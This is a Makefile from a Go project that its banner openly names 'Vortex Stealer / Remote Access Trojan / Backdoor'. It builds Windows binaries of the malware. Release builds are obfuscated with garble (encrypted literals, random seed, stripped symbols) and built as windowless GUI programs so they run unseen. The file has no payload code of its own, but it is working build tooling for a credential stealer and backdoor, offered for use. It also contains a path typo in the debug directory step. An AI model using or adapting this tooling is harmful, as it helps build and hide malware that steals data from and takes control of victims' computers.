EXECBIN=vortex
AUTHOR=r0ttenbeef
VERSION=3.5
DEBUG_BUILD=$(EXECBIN)-$(VERSION)_debug.exe
RELEASE_BUILD32=$(EXECBIN)-$(VERSION)_x86.exe
RELEASE_BUILD64=$(EXECBIN)-$(VERSION)_x64.exe

define ANNOUNCE_BODY

░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓█▓▒▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓█▓▒▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░  ░▒▓█▓▒░   ░▒▓██████▓▒░  ░▒▓██████▓▒░  
  ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
  ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
   ░▒▓██▓▒░   ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░
                 Vortex Stealer / Remote Access Trojan / Backdoor
Author: $(AUTHOR) -- Version $(VERSION)
---
endef

export ANNOUNCE_BODY
.PHONY: release_x32 release_x64 debug

release_x32: release_dir init build_release_x32
release_x64: release_dir init build_release_x64
debug: debug_dir init build_debug

debug_dir:
	@if [ ! -d bin ];then mkdir bin;fi
	@if [ ! -d bin/debug ];then mkdir bind/debug;fi

release_dir:
	@if [ ! -d bin ];then mkdir bin;fi
	@if [ ! -d bin/release ];then mkdir bin/release;fi

init:
	@echo "$$ANNOUNCE_BODY"
	@echo "[*]Generate Modules and install"
	@if [ ! -f go.mod ]; then go mod init vortex;fi
	@go get -v .
	@echo "[*]Generate resource file"
	@go generate
	@echo "[*]Installing Garble"
	go install mvdan.cc/garble@latest

build_release_x32:
	@echo "[*]Compiling release build for windows x86 architicture"
	@env GOOS=windows GOARCH=386 CGO_ENABLED=1 CC=i686-w64-mingw32-gcc CXX=i686-w64-mingw32-g++ $(shell go env GOPATH)/bin/garble -debug -literals -tiny -seed=random build -v -o bin/release/$(RELEASE_BUILD32) -ldflags="-s -w -H windowsgui"
	@go clean -cache
	@echo [+]$(EXECBIN) - $(VERSION) - $(AUTHOR)
	@echo [+]$(EXECBIN) 32bit release version compiled successfully

build_release_x64:
	@echo "[*]Compiling release build for windows x64 architicture"
	@env GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ $(shell go env GOPATH)/bin/garble -debug -literals -tiny -seed=random build -v -o bin/release/$(RELEASE_BUILD64) -ldflags="-s -w -H windowsgui"
	@go clean -cache
	@echo [+]$(EXECBIN) - $(VERSION) - $(AUTHOR)
	@echo [+]$(EXECBIN) 64bit release version compiled successfully

build_debug:
	@echo "[*]Compiling debug build for windows x64 architicture"
	env GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -v -o bin/debug/$(DEBUG_BUILD)
	@echo [+]$(EXECBIN) - $(VERSION) - $(AUTHOR)
	@echo [+]$(EXECBIN) 64bit debug version compiled successfully
